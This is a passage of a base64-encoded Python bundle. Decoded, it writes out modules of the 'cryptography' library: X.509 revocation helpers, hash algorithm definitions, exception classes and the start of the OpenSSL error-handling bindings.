yIilcclxuICAgICAgICBpZiBzZWxmLl9yZXZvY2F0aW9uX2RhdGUgaXMgTm9uZTpcclxuICAgICAgICAgICAgcmFpc2UgVmFsdWVFcnJvcihcclxuICAgICAgICAgICAgICAgICJBIHJldm9rZWQgY2VydGlmaWNhdGUgbXVzdCBoYXZlIGEgcmV2b2NhdGlvbiBkYXRlIlxyXG4gICAgICAgICAgICApXHJcbiAgICAgICAgcmV0dXJuIF9SYXdSZXZva2VkQ2VydGlmaWNhdGUoXHJcbiAgICAgICAgICAgIHNlbGYuX3NlcmlhbF9udW1iZXIsXHJcbiAgICAgICAgICAgIHNlbGYuX3Jldm9jYXRpb25fZGF0ZSxcclxuICAgICAgICAgICAgRXh0ZW5zaW9ucyhzZWxmLl9leHRlbnNpb25zKSxcclxuICAgICAgICApXHJcblxyXG5cclxuZGVmIHJhbmRvbV9zZXJpYWxfbnVtYmVyKCkgLT4gaW50OlxyXG4gICAgcmV0dXJuIGludC5mcm9tX2J5dGVzKG9zLnVyYW5kb20oMjApLCAiYmlnIikgPj4gMVxyXG4nKQogICAgX19zdGlja3l0YXBlX3dyaXRlX21vZHVsZSgnY3J5cHRvZ3JhcGh5L2hhem1hdC9wcmltaXRpdmVzL19faW5pdF9fLnB5JywgYicjIFRoaXMgZmlsZSBpcyBkdWFsIGxpY2Vuc2VkIHVuZGVyIHRoZSB0ZXJtcyBvZiB0aGUgQXBhY2hlIExpY2Vuc2UsIFZlcnNpb25cclxuIyAyLjAsIGFuZCB0aGUgQlNEIExpY2Vuc2UuIFNlZSB0aGUgTElDRU5TRSBmaWxlIGluIHRoZSByb290IG9mIHRoaXMgcmVwb3NpdG9yeVxyXG4jIGZvciBjb21wbGV0ZSBkZXRhaWxzLlxyXG4nKQogICAgX19zdGlja3l0YXBlX3dyaXRlX21vZHVsZSgnY3J5cHRvZ3JhcGh5L2hhem1hdC9wcmltaXRpdmVzL2hhc2hlcy5weScsIGInIyBUaGlzIGZpbGUgaXMgZHVhbCBsaWNlbnNlZCB1bmRlciB0aGUgdGVybXMgb2YgdGhlIEFwYWNoZSBMaWNlbnNlLCBWZXJzaW9uXHJcbiMgMi4wLCBhbmQgdGhlIEJTRCBMaWNlbnNlLiBTZWUgdGhlIExJQ0VOU0UgZmlsZSBpbiB0aGUgcm9vdCBvZiB0aGlzIHJlcG9zaXRvcnlcclxuIyBmb3IgY29tcGxldGUgZGV0YWlscy5cclxuXHJcbmltcG9ydCBhYmNcclxuaW1wb3J0IHR5cGluZ1xyXG5cclxuZnJvbSBjcnlwdG9ncmFwaHkgaW1wb3J0IHV0aWxzXHJcbmZyb20gY3J5cHRvZ3JhcGh5LmV4Y2VwdGlvbnMgaW1wb3J0IChcclxuICAgIEFscmVhZHlGaW5hbGl6ZWQsXHJcbilcclxuXHJcblxyXG5jbGFzcyBIYXNoQWxnb3JpdGhtKG1ldGFjbGFzcz1hYmMuQUJDTWV0YSk6XHJcbiAgICBAYWJjLmFic3RyYWN0cHJvcGVydHlcclxuICAgIGRlZiBuYW1lKHNlbGYpIC0+IHN0cjpcclxuICAgICAgICAiIiJcclxuICAgICAgICBBIHN0cmluZyBuYW1pbmcgdGhpcyBhbGdvcml0aG0gKGUuZy4gInNoYTI1NiIsICJtZDUiKS5cclxuICAgICAgICAiIiJcclxuXHJcbiAgICBAYWJjLmFic3RyYWN0cHJvcGVydHlcclxuICAgIGRlZiBkaWdlc3Rfc2l6ZShzZWxmKSAtPiBpbnQ6XHJcbiAgICAgICAgIiIiXHJcbiAgICAgICAgVGhlIHNpemUgb2YgdGhlIHJlc3VsdGluZyBkaWdlc3QgaW4gYnl0ZXMuXHJcbiAgICAgICAgIiIiXHJcblxyXG4gICAgQGFiYy5hYnN0cmFjdHByb3BlcnR5XHJcbiAgICBkZWYgYmxvY2tfc2l6ZShzZWxmKSAtPiB0eXBpbmcuT3B0aW9uYWxbaW50XTpcclxuICAgICAgICAiIiJcclxuICAgICAgICBUaGUgaW50ZXJuYWwgYmxvY2sgc2l6ZSBvZiB0aGUgaGFzaCBmdW5jdGlvbiwgb3IgTm9uZSBpZiB0aGUgaGFzaFxyXG4gICAgICAgIGZ1bmN0aW9uIGRvZXMgbm90IHVzZSBibG9ja3MgaW50ZXJuYWxseSAoZS5nLiBTSEEzKS5cclxuICAgICAgICAiIiJcclxuXHJcblxyXG5jbGFzcyBIYXNoQ29udGV4dChtZXRhY2xhc3M9YWJjLkFCQ01ldGEpOlxyXG4gICAgQGFiYy5hYnN0cmFjdHByb3BlcnR5XHJcbiAgICBkZWYgYWxnb3JpdGhtKHNlbGYpIC0+IEhhc2hBbGdvcml0aG06XHJcbiAgICAgICAgIiIiXHJcbiAgICAgICAgQSBIYXNoQWxnb3JpdGhtIHRoYXQgd2lsbCBiZSB1c2VkIGJ5IHRoaXMgY29udGV4dC5cclxuICAgICAgICAiIiJcclxuXHJcbiAgICBAYWJjLmFic3RyYWN0bWV0aG9kXHJcbiAgICBkZWYgdXBkYXRlKHNlbGYsIGRhdGE6IGJ5dGVzKSAtPiBOb25lOlxyXG4gICAgICAgICIiIlxyXG4gICAgICAgIFByb2Nlc3NlcyB0aGUgcHJvdmlkZWQgYnl0ZXMgdGhyb3VnaCB0aGUgaGFzaC5cclxuICAgICAgICAiIiJcclxuXHJcbiAgICBAYWJjLmFic3RyYWN0bWV0aG9kXHJcbiAgICBkZWYgZmluYWxpemUoc2VsZikgLT4gYnl0ZXM6XHJcbiAgICAgICAgIiIiXHJcbiAgICAgICAgRmluYWxpemVzIHRoZSBoYXNoIGNvbnRleHQgYW5kIHJldHVybnMgdGhlIGhhc2ggZGlnZXN0IGFzIGJ5dGVzLlxyXG4gICAgICAgICIiIlxyXG5cclxuICAgIEBhYmMuYWJzdHJhY3RtZXRob2RcclxuICAgIGRlZiBjb3B5KHNlbGYpIC0+ICJIYXNoQ29udGV4dCI6XHJcbiAgICAgICAgIiIiXHJcbiAgICAgICAgUmV0dXJuIGEgSGFzaENvbnRleHQgdGhhdCBpcyBhIGNvcHkgb2YgdGhlIGN1cnJlbnQgY29udGV4dC5cclxuICAgICAgICAiIiJcclxuXHJcblxyXG5jbGFzcyBFeHRlbmRhYmxlT3V0cHV0RnVuY3Rpb24obWV0YWNsYXNzPWFiYy5BQkNNZXRhKTpcclxuICAgICIiIlxyXG4gICAgQW4gaW50ZXJmYWNlIGZvciBleHRlbmRhYmxlIG91dHB1dCBmdW5jdGlvbnMuXHJcbiAgICAiIiJcclxuXHJcblxyXG5jbGFzcyBIYXNoKEhhc2hDb250ZXh0KTpcclxuICAgIF9jdHg6IHR5cGluZy5PcHRpb25hbFtIYXNoQ29udGV4dF1cclxuXHJcbiAgICBkZWYgX19pbml0X18oXHJcbiAgICAgICAgc2VsZixcclxuICAgICAgICBhbGdvcml0aG06IEhhc2hBbGdvcml0aG0sXHJcbiAgICAgICAgYmFja2VuZDogdHlwaW5nLkFueSA9IE5vbmUsXHJcbiAgICAgICAgY3R4OiB0eXBpbmcuT3B0aW9uYWxbIkhhc2hDb250ZXh0Il0gPSBOb25lLFxyXG4gICAgKTpcclxuICAgICAgICBpZiBub3QgaXNpbnN0YW5jZShhbGdvcml0aG0sIEhhc2hBbGdvcml0aG0pOlxyXG4gICAgICAgICAgICByYWlzZSBUeXBlRXJyb3IoIkV4cGVjdGVkIGluc3RhbmNlIG9mIGhhc2hlcy5IYXNoQWxnb3JpdGhtLiIpXHJcbiAgICAgICAgc2VsZi5fYWxnb3JpdGhtID0gYWxnb3JpdGhtXHJcblxyXG4gICAgICAgIGlmIGN0eCBpcyBOb25lOlxyXG4gICAgICAgICAgICBmcm9tIGNyeXB0b2dyYXBoeS5oYXptYXQuYmFja2VuZHMub3BlbnNzbC5iYWNrZW5kIGltcG9ydCAoXHJcbiAgICAgICAgICAgICAgICBiYWNrZW5kIGFzIG9zc2wsXHJcbiAgICAgICAgICAgIClcclxuXHJcbiAgICAgICAgICAgIHNlbGYuX2N0eCA9IG9zc2wuY3JlYXRlX2hhc2hfY3R4KHNlbGYuYWxnb3JpdGhtKVxyXG4gICAgICAgIGVsc2U6XHJcbiAgICAgICAgICAgIHNlbGYuX2N0eCA9IGN0eFxyXG5cclxuICAgIEBwcm9wZXJ0eVxyXG4gICAgZGVmIGFsZ29yaXRobShzZWxmKSAtPiBIYXNoQWxnb3JpdGhtOlxyXG4gICAgICAgIHJldHVybiBzZWxmLl9hbGdvcml0aG1cclxuXHJcbiAgICBkZWYgdXBkYXRlKHNlbGYsIGRhdGE6IGJ5dGVzKSAtPiBOb25lOlxyXG4gICAgICAgIGlmIHNlbGYuX2N0eCBpcyBOb25lOlxyXG4gICAgICAgICAgICByYWlzZSBBbHJlYWR5RmluYWxpemVkKCJDb250ZXh0IHdhcyBhbHJlYWR5IGZpbmFsaXplZC4iKVxyXG4gICAgICAgIHV0aWxzLl9jaGVja19ieXRlc2xpa2UoImRhdGEiLCBkYXRhKVxyXG4gICAgICAgIHNlbGYuX2N0eC51cGRhdGUoZGF0YSlcclxuXHJcbiAgICBkZWYgY29weShzZWxmKSAtPiAiSGFzaCI6XHJcbiAgICAgICAgaWYgc2VsZi5fY3R4IGlzIE5vbmU6XHJcbiAgICAgICAgICAgIHJhaXNlIEFscmVhZHlGaW5hbGl6ZWQoIkNvbnRleHQgd2FzIGFscmVhZHkgZmluYWxpemVkLiIpXHJcbiAgICAgICAgcmV0dXJuIEhhc2goc2VsZi5hbGdvcml0aG0sIGN0eD1zZWxmLl9jdHguY29weSgpKVxyXG5cclxuICAgIGRlZiBmaW5hbGl6ZShzZWxmKSAtPiBieXRlczpcclxuICAgICAgICBpZiBzZWxmLl9jdHggaXMgTm9uZTpcclxuICAgICAgICAgICAgcmFpc2UgQWxyZWFkeUZpbmFsaXplZCgiQ29udGV4dCB3YXMgYWxyZWFkeSBmaW5hbGl6ZWQuIilcclxuICAgICAgICBkaWdlc3QgPSBzZWxmLl9jdHguZmluYWxpemUoKVxyXG4gICAgICAgIHNlbGYuX2N0eCA9IE5vbmVcclxuICAgICAgICByZXR1cm4gZGlnZXN0XHJcblxyXG5cclxuY2xhc3MgU0hBMShIYXNoQWxnb3JpdGhtKTpcclxuICAgIG5hbWUgPSAic2hhMSJcclxuICAgIGRpZ2VzdF9zaXplID0gMjBcclxuICAgIGJsb2NrX3NpemUgPSA2NFxyXG5cclxuXHJcbmNsYXNzIFNIQTUxMl8yMjQoSGFzaEFsZ29yaXRobSk6ICAjIG5vcWE6IE44MDFcclxuICAgIG5hbWUgPSAic2hhNTEyLTIyNCJcclxuICAgIGRpZ2VzdF9zaXplID0gMjhcclxuICAgIGJsb2NrX3NpemUgPSAxMjhcclxuXHJcblxyXG5jbGFzcyBTSEE1MTJfMjU2KEhhc2hBbGdvcml0aG0pOiAgIyBub3FhOiBOODAxXHJcbiAgICBuYW1lID0gInNoYTUxMi0yNTYiXHJcbiAgICBkaWdlc3Rfc2l6ZSA9IDMyXHJcbiAgICBibG9ja19zaXplID0gMTI4XHJcblxyXG5cclxuY2xhc3MgU0hBMjI0KEhhc2hBbGdvcml0aG0pOlxyXG4gICAgbmFtZSA9ICJzaGEyMjQiXHJcbiAgICBkaWdlc3Rfc2l6ZSA9IDI4XHJcbiAgICBibG9ja19zaXplID0gNjRcclxuXHJcblxyXG5jbGFzcyBTSEEyNTYoSGFzaEFsZ29yaXRobSk6XHJcbiAgICBuYW1lID0gInNoYTI1NiJcclxuICAgIGRpZ2VzdF9zaXplID0gMzJcclxuICAgIGJsb2NrX3NpemUgPSA2NFxyXG5cclxuXHJcbmNsYXNzIFNIQTM4NChIYXNoQWxnb3JpdGhtKTpcclxuICAgIG5hbWUgPSAic2hhMzg0IlxyXG4gICAgZGlnZXN0X3NpemUgPSA0OFxyXG4gICAgYmxvY2tfc2l6ZSA9IDEyOFxyXG5cclxuXHJcbmNsYXNzIFNIQTUxMihIYXNoQWxnb3JpdGhtKTpcclxuICAgIG5hbWUgPSAic2hhNTEyIlxyXG4gICAgZGlnZXN0X3NpemUgPSA2NFxyXG4gICAgYmxvY2tfc2l6ZSA9IDEyOFxyXG5cclxuXHJcbmNsYXNzIFNIQTNfMjI0KEhhc2hBbGdvcml0aG0pOiAgIyBub3FhOiBOODAxXHJcbiAgICBuYW1lID0gInNoYTMtMjI0IlxyXG4gICAgZGlnZXN0X3NpemUgPSAyOFxyXG4gICAgYmxvY2tfc2l6ZSA9IE5vbmVcclxuXHJcblxyXG5jbGFzcyBTSEEzXzI1NihIYXNoQWxnb3JpdGhtKTogICMgbm9xYTogTjgwMVxyXG4gICAgbmFtZSA9ICJzaGEzLTI1NiJcclxuICAgIGRpZ2VzdF9zaXplID0gMzJcclxuICAgIGJsb2NrX3NpemUgPSBOb25lXHJcblxyXG5cclxuY2xhc3MgU0hBM18zODQoSGFzaEFsZ29yaXRobSk6ICAjIG5vcWE6IE44MDFcclxuICAgIG5hbWUgPSAic2hhMy0zODQiXHJcbiAgICBkaWdlc3Rfc2l6ZSA9IDQ4XHJcbiAgICBibG9ja19zaXplID0gTm9uZVxyXG5cclxuXHJcbmNsYXNzIFNIQTNfNTEyKEhhc2hBbGdvcml0aG0pOiAgIyBub3FhOiBOODAxXHJcbiAgICBuYW1lID0gInNoYTMtNTEyIlxyXG4gICAgZGlnZXN0X3NpemUgPSA2NFxyXG4gICAgYmxvY2tfc2l6ZSA9IE5vbmVcclxuXHJcblxyXG5jbGFzcyBTSEFLRTEyOChIYXNoQWxnb3JpdGhtLCBFeHRlbmRhYmxlT3V0cHV0RnVuY3Rpb24pOlxyXG4gICAgbmFtZSA9ICJzaGFrZTEyOCJcclxuICAgIGJsb2NrX3NpemUgPSBOb25lXHJcblxyXG4gICAgZGVmIF9faW5pdF9fKHNlbGYsIGRpZ2VzdF9zaXplOiBpbnQpOlxyXG4gICAgICAgIGlmIG5vdCBpc2luc3RhbmNlKGRpZ2VzdF9zaXplLCBpbnQpOlxyXG4gICAgICAgICAgICByYWlzZSBUeXBlRXJyb3IoImRpZ2VzdF9zaXplIG11c3QgYmUgYW4gaW50ZWdlciIpXHJcblxyXG4gICAgICAgIGlmIGRpZ2VzdF9zaXplIDwgMTpcclxuICAgICAgICAgICAgcmFpc2UgVmFsdWVFcnJvcigiZGlnZXN0X3NpemUgbXVzdCBiZSBhIHBvc2l0aXZlIGludGVnZXIiKVxyXG5cclxuICAgICAgICBzZWxmLl9kaWdlc3Rfc2l6ZSA9IGRpZ2VzdF9zaXplXHJcblxyXG4gICAgQHByb3BlcnR5XHJcbiAgICBkZWYgZGlnZXN0X3NpemUoc2VsZikgLT4gaW50OlxyXG4gICAgICAgIHJldHVybiBzZWxmLl9kaWdlc3Rfc2l6ZVxyXG5cclxuXHJcbmNsYXNzIFNIQUtFMjU2KEhhc2hBbGdvcml0aG0sIEV4dGVuZGFibGVPdXRwdXRGdW5jdGlvbik6XHJcbiAgICBuYW1lID0gInNoYWtlMjU2IlxyXG4gICAgYmxvY2tfc2l6ZSA9IE5vbmVcclxuXHJcbiAgICBkZWYgX19pbml0X18oc2VsZiwgZGlnZXN0X3NpemU6IGludCk6XHJcbiAgICAgICAgaWYgbm90IGlzaW5zdGFuY2UoZGlnZXN0X3NpemUsIGludCk6XHJcbiAgICAgICAgICAgIHJhaXNlIFR5cGVFcnJvcigiZGlnZXN0X3NpemUgbXVzdCBiZSBhbiBpbnRlZ2VyIilcclxuXHJcbiAgICAgICAgaWYgZGlnZXN0X3NpemUgPCAxOlxyXG4gICAgICAgICAgICByYWlzZSBWYWx1ZUVycm9yKCJkaWdlc3Rfc2l6ZSBtdXN0IGJlIGEgcG9zaXRpdmUgaW50ZWdlciIpXHJcblxyXG4gICAgICAgIHNlbGYuX2RpZ2VzdF9zaXplID0gZGlnZXN0X3NpemVcclxuXHJcbiAgICBAcHJvcGVydHlcclxuICAgIGRlZiBkaWdlc3Rfc2l6ZShzZWxmKSAtPiBpbnQ6XHJcbiAgICAgICAgcmV0dXJuIHNlbGYuX2RpZ2VzdF9zaXplXHJcblxyXG5cclxuY2xhc3MgTUQ1KEhhc2hBbGdvcml0aG0pOlxyXG4gICAgbmFtZSA9ICJtZDUiXHJcbiAgICBkaWdlc3Rfc2l6ZSA9IDE2XHJcbiAgICBibG9ja19zaXplID0gNjRcclxuXHJcblxyXG5jbGFzcyBCTEFLRTJiKEhhc2hBbGdvcml0aG0pOlxyXG4gICAgbmFtZSA9ICJibGFrZTJiIlxyXG4gICAgX21heF9kaWdlc3Rfc2l6ZSA9IDY0XHJcbiAgICBfbWluX2RpZ2VzdF9zaXplID0gMVxyXG4gICAgYmxvY2tfc2l6ZSA9IDEyOFxyXG5cclxuICAgIGRlZiBfX2luaXRfXyhzZWxmLCBkaWdlc3Rfc2l6ZTogaW50KTpcclxuXHJcbiAgICAgICAgaWYgZGlnZXN0X3NpemUgIT0gNjQ6XHJcbiAgICAgICAgICAgIHJhaXNlIFZhbHVlRXJyb3IoIkRpZ2VzdCBzaXplIG11c3QgYmUgNjQiKVxyXG5cclxuICAgICAgICBzZWxmLl9kaWdlc3Rfc2l6ZSA9IGRpZ2VzdF9zaXplXHJcblxyXG4gICAgQHByb3BlcnR5XHJcbiAgICBkZWYgZGlnZXN0X3NpemUoc2VsZikgLT4gaW50OlxyXG4gICAgICAgIHJldHVybiBzZWxmLl9kaWdlc3Rfc2l6ZVxyXG5cclxuXHJcbmNsYXNzIEJMQUtFMnMoSGFzaEFsZ29yaXRobSk6XHJcbiAgICBuYW1lID0gImJsYWtlMnMiXHJcbiAgICBibG9ja19zaXplID0gNjRcclxuICAgIF9tYXhfZGlnZXN0X3NpemUgPSAzMlxyXG4gICAgX21pbl9kaWdlc3Rfc2l6ZSA9IDFcclxuXHJcbiAgICBkZWYgX19pbml0X18oc2VsZiwgZGlnZXN0X3NpemU6IGludCk6XHJcblxyXG4gICAgICAgIGlmIGRpZ2VzdF9zaXplICE9IDMyOlxyXG4gICAgICAgICAgICByYWlzZSBWYWx1ZUVycm9yKCJEaWdlc3Qgc2l6ZSBtdXN0IGJlIDMyIilcclxuXHJcbiAgICAgICAgc2VsZi5fZGlnZXN0X3NpemUgPSBkaWdlc3Rfc2l6ZVxyXG5cclxuICAgIEBwcm9wZXJ0eVxyXG4gICAgZGVmIGRpZ2VzdF9zaXplKHNlbGYpIC0+IGludDpcclxuICAgICAgICByZXR1cm4gc2VsZi5fZGlnZXN0X3NpemVcclxuXHJcblxyXG5jbGFzcyBTTTMoSGFzaEFsZ29yaXRobSk6XHJcbiAgICBuYW1lID0gInNtMyJcclxuICAgIGRpZ2VzdF9zaXplID0gMzJcclxuICAgIGJsb2NrX3NpemUgPSA2NFxyXG4nKQogICAgX19zdGlja3l0YXBlX3dyaXRlX21vZHVsZSgnY3J5cHRvZ3JhcGh5L2V4Y2VwdGlvbnMucHknLCBiJyMgVGhpcyBmaWxlIGlzIGR1YWwgbGljZW5zZWQgdW5kZXIgdGhlIHRlcm1zIG9mIHRoZSBBcGFjaGUgTGljZW5zZSwgVmVyc2lvblxyXG4jIDIuMCwgYW5kIHRoZSBCU0QgTGljZW5zZS4gU2VlIHRoZSBMSUNFTlNFIGZpbGUgaW4gdGhlIHJvb3Qgb2YgdGhpcyByZXBvc2l0b3J5XHJcbiMgZm9yIGNvbXBsZXRlIGRldGFpbHMuXHJcblxyXG5cclxuaW1wb3J0IHR5cGluZ1xyXG5cclxuZnJvbSBjcnlwdG9ncmFwaHkgaW1wb3J0IHV0aWxzXHJcblxyXG5pZiB0eXBpbmcuVFlQRV9DSEVDS0lORzpcclxuICAgIGZyb20gY3J5cHRvZ3JhcGh5Lmhhem1hdC5iaW5kaW5ncy5vcGVuc3NsLmJpbmRpbmcgaW1wb3J0IChcclxuICAgICAgICBfT3BlblNTTEVycm9yV2l0aFRleHQsXHJcbiAgICApXHJcblxyXG5cclxuY2xhc3MgX1JlYXNvbnModXRpbHMuRW51bSk6XHJcbiAgICBCQUNLRU5EX01JU1NJTkdfSU5URVJGQUNFID0gMFxyXG4gICAgVU5TVVBQT1JURURfSEFTSCA9IDFcclxuICAgIFVOU1VQUE9SVEVEX0NJUEhFUiA9IDJcclxuICAgIFVOU1VQUE9SVEVEX1BBRERJTkcgPSAzXHJcbiAgICBVTlNVUFBPUlRFRF9NR0YgPSA0XHJcbiAgICBVTlNVUFBPUlRFRF9QVUJMSUNfS0VZX0FMR09SSVRITSA9IDVcclxuICAgIFVOU1VQUE9SVEVEX0VMTElQVElDX0NVUlZFID0gNlxyXG4gICAgVU5TVVBQT1JURURfU0VSSUFMSVpBVElPTiA9IDdcclxuICAgIFVOU1VQUE9SVEVEX1g1MDkgPSA4XHJcbiAgICBVTlNVUFBPUlRFRF9FWENIQU5HRV9BTEdPUklUSE0gPSA5XHJcbiAgICBVTlNVUFBPUlRFRF9ESUZGSUVfSEVMTE1BTiA9IDEwXHJcbiAgICBVTlNVUFBPUlRFRF9NQUMgPSAxMVxyXG5cclxuXHJcbmNsYXNzIFVuc3VwcG9ydGVkQWxnb3JpdGhtKEV4Y2VwdGlvbik6XHJcbiAgICBkZWYgX19pbml0X18oXHJcbiAgICAgICAgc2VsZiwgbWVzc2FnZTogc3RyLCByZWFzb246IHR5cGluZy5PcHRpb25hbFtfUmVhc29uc10gPSBOb25lXHJcbiAgICApIC0+IE5vbmU6XHJcbiAgICAgICAgc3VwZXIoVW5zdXBwb3J0ZWRBbGdvcml0aG0sIHNlbGYpLl9faW5pdF9fKG1lc3NhZ2UpXHJcbiAgICAgICAgc2VsZi5fcmVhc29uID0gcmVhc29uXHJcblxyXG5cclxuY2xhc3MgQWxyZWFkeUZpbmFsaXplZChFeGNlcHRpb24pOlxyXG4gICAgcGFzc1xyXG5cclxuXHJcbmNsYXNzIEFscmVhZHlVcGRhdGVkKEV4Y2VwdGlvbik6XHJcbiAgICBwYXNzXHJcblxyXG5cclxuY2xhc3MgTm90WWV0RmluYWxpemVkKEV4Y2VwdGlvbik6XHJcbiAgICBwYXNzXHJcblxyXG5cclxuY2xhc3MgSW52YWxpZFRhZyhFeGNlcHRpb24pOlxyXG4gICAgcGFzc1xyXG5cclxuXHJcbmNsYXNzIEludmFsaWRTaWduYXR1cmUoRXhjZXB0aW9uKTpcclxuICAgIHBhc3NcclxuXHJcblxyXG5jbGFzcyBJbnRlcm5hbEVycm9yKEV4Y2VwdGlvbik6XHJcbiAgICBkZWYgX19pbml0X18oXHJcbiAgICAgICAgc2VsZiwgbXNnOiBzdHIsIGVycl9jb2RlOiB0eXBpbmcuTGlzdFsiX09wZW5TU0xFcnJvcldpdGhUZXh0Il1cclxuICAgICkgLT4gTm9uZTpcclxuICAgICAgICBzdXBlcihJbnRlcm5hbEVycm9yLCBzZWxmKS5fX2luaXRfXyhtc2cpXHJcbiAgICAgICAgc2VsZi5lcnJfY29kZSA9IGVycl9jb2RlXHJcblxyXG5cclxuY2xhc3MgSW52YWxpZEtleShFeGNlcHRpb24pOlxyXG4gICAgcGFzc1xyXG4nKQogICAgX19zdGlja3l0YXBlX3dyaXRlX21vZHVsZSgnY3J5cHRvZ3JhcGh5L2hhem1hdC9iaW5kaW5ncy9vcGVuc3NsL19faW5pdF9fLnB5JywgYicjIFRoaXMgZmlsZSBpcyBkdWFsIGxpY2Vuc2VkIHVuZGVyIHRoZSB0ZXJtcyBvZiB0aGUgQXBhY2hlIExpY2Vuc2UsIFZlcnNpb25cclxuIyAyLjAsIGFuZCB0aGUgQlNEIExpY2Vuc2UuIFNlZSB0aGUgTElDRU5TRSBmaWxlIGluIHRoZSByb290IG9mIHRoaXMgcmVwb3NpdG9yeVxyXG4jIGZvciBjb21wbGV0ZSBkZXRhaWxzLlxyXG4nKQogICAgX19zdGlja3l0YXBlX3dyaXRlX21vZHVsZSgnY3J5cHRvZ3JhcGh5L2hhem1hdC9iaW5kaW5ncy9vcGVuc3NsL2JpbmRpbmcucHknLCBiJyMgVGhpcyBmaWxlIGlzIGR1YWwgbGljZW5zZWQgdW5kZXIgdGhlIHRlcm1zIG9mIHRoZSBBcGFjaGUgTGljZW5zZSwgVmVyc2lvblxyXG4jIDIuMCwgYW5kIHRoZSBCU0QgTGljZW5zZS4gU2VlIHRoZSBMSUNFTlNFIGZpbGUgaW4gdGhlIHJvb3Qgb2YgdGhpcyByZXBvc2l0b3J5XHJcbiMgZm9yIGNvbXBsZXRlIGRldGFpbHMuXHJcblxyXG5cclxuaW1wb3J0IHRocmVhZGluZ1xyXG5pbXBvcnQgdHlwZXNcclxuaW1wb3J0IHR5cGluZ1xyXG5pbXBvcnQgd2FybmluZ3NcclxuXHJcbmltcG9ydCBjcnlwdG9ncmFwaHlcclxuZnJvbSBjcnlwdG9ncmFwaHkgaW1wb3J0IHV0aWxzXHJcbmZyb20gY3J5cHRvZ3JhcGh5LmV4Y2VwdGlvbnMgaW1wb3J0IEludGVybmFsRXJyb3JcclxuZnJvbSBjcnlwdG9ncmFwaHkuaGF6bWF0LmJpbmRpbmdzLl9vcGVuc3NsIGltcG9ydCBmZmksIGxpYlxyXG5mcm9tIGNyeXB0b2dyYXBoeS5oYXptYXQuYmluZGluZ3Mub3BlbnNzbC5fY29uZGl0aW9uYWwgaW1wb3J0IENPTkRJVElPTkFMX05BTUVTXHJcblxyXG5fT3BlblNTTEVycm9yV2l0aFRleHQgPSB0eXBpbmcuTmFtZWRUdXBsZShcclxuICAgICJfT3BlblNTTEVycm9yV2l0aFRleHQiLFxyXG4gICAgWygiY29kZSIsIGludCksICgibGliIiwgaW50KSwgKCJyZWFzb24iLCBpbnQpLCAoInJlYXNvbl90ZXh0IiwgYnl0ZXMpXSxcclxuKVxyXG5cclxuXHJcbmNsYXNzIF9PcGVuU1NMRXJyb3I6XHJcbiAgICBkZWYgX19pbml0X18oc2VsZiwgY29kZTogaW50LCBsaWI6IGludCwgcmVhc29uOiBpbnQpOlxyXG4gICAgICAgIHNlbGYuX2NvZGUgPSBjb2RlXHJcbiAgICAgICAgc2VsZi5fbGliID0gbGliXHJcbiAgICAgICAgc2VsZi5fcmVhc29uID0gcmVhc29uXHJcblxyXG4gICAgZGVmIF9saWJfcmVhc29uX21hdGNoKHNlbGYsIGxpYjogaW50LCByZWFzb246IGludCkgLT4gYm9vbDpcclxuICAgICAgICByZXR1cm4gbGliID09IHNlbGYubGliIGFuZCByZWFzb24gPT0gc2VsZi5yZWFzb25cclxuXHJcbiAgICBAcHJvcGVydHlcclxuICAgIGRlZiBjb2RlKHNlbGYpIC0+IGludDpcclxuICAgICAgICByZXR1cm4gc2VsZi5fY29kZVxyXG5cclxuICAgIEBwcm9wZXJ0eVxyXG4gICAgZGVmIGxpYihzZWxmKSAtPiBpbnQ6XHJcbiAgICAgICAgcmV0dXJuIHNlbGYuX2xpYlxyXG5cclxuICAgIEBwcm9wZXJ0eVxyXG4gICAgZGVmIHJlYXNvbihzZWxmKSAtPiBpbnQ6XHJcbiAgICAgICAgcmV0dXJuIHNlbGYuX3JlYXNvblxyXG5cclxuXHJcbmRlZiBfY29uc3VtZV9lcnJvcnMobGliKSAtPiB0eXBpbmcuTGlzdFtfT3BlblNTTEVycm9yXTpcclxuICAgIGVycm9ycyA9IFtdXHJcbiAgICB3aGlsZSBUcnVlOlxyXG4gICAgICAgIGNvZGU6IGludCA9IGxpYi5FUlJfZ2V0X2Vycm9yKClcclxuICAgICAgICBpZiBjb2RlID09IDA6XHJcbiAgICAgICAgICAgIGJyZWFrXHJcblxyXG4gICAgICAgIGVycl9saWI6IGludCA9IGxpYi5FUlJfR0VUX0xJQihjb2RlKVxyXG4gICAgICAgIGVycl9yZWFzb246IGludCA9IGxpYi5FUlJfR0VUX1JFQVNPTihjb2RlKVxyXG5cclxuICAgICAgICBlcnJvcnMuYXBwZW5kKF9PcGVuU1NMRXJyb3IoY29kZSwgZXJyX2xpYiwgZXJyX3JlYXNvbikpXHJcblxyXG4gICAgcmV0dXJuIGVycm9yc1xyXG5cclxuXHJcbmRlZiBfZXJyb3JzX3dpdGhfdGV4dChcclxuICAgIGVycm9yczogdHlwaW5nLkxpc3RbX09wZW5TU0xFcnJvcl0sXHJcbikgLT4gdHlwaW5nLkxpc3RbX09wZW5TU0xFcnJvcldpdGhUZXh0XTpcclxuICAgIGVycm9yc193aXRoX3RleHQgPSBbXVxyXG4gICAgZm9yIGVyciBpbiBlcnJvcnM6XHJcbiAgICAgICAgYnVmID0gZmZpLm5ldygiY2hhcltdIiwgMjU2KVxyXG4gICAgICAgIGxpYi5FUlJfZXJyb3Jfc3RyaW5nX24oZXJyLmNvZGUsIGJ1ZiwgbGVuKGJ1ZikpXHJcbiAgICAgICAgZXJyX3RleHRfcmVhc29uOiBieXRlcyA9IGZmaS5zdHJpbmcoYnVmKVxyXG5cclxuICAgICAgICBlcnJvcnNfd2l0aF90ZXh0LmFwcGVuZChcclxuICAgICAgICAgICAgX09wZW5TU0xFcnJvcldpdGhUZXh0KFxyXG4gICAgICAgICAgICAgICAgZXJyLmNvZGUsIGVyci5saWIsIGVyci5yZWFzb24sIGVycl90ZXh0X3JlYXNvblxyXG4gICAgICAgICAgICApXHJcbiAgICAgICAgKVxyXG5cclxuICAgIHJldHVybiBlcnJvcnNfd2l0aF90ZXh0XHJcblxyXG5cclxuZGVmIF9jb25zdW1lX2Vycm9yc193aXRoX3RleHQobGliKTpcclxuICAgIHJldHVybiBfZXJyb3JzX3dpdGhfdGV4dChfY29uc3VtZV9lcnJvcnMobGliKSlcclxuXHJcblxyXG5kZWYgX29wZW5zc2xfYXNzZXJ0KFxyXG4gICAgbGliLCBvazogYm9vbCwgZXJyb3JzOiB0eXBpbmcuT3B0aW9uYWxbdHlwaW5nLkxpc3RbX09wZW5TU0xFcnJvcl1dID0gTm9uZVxyXG4pIC0+IE5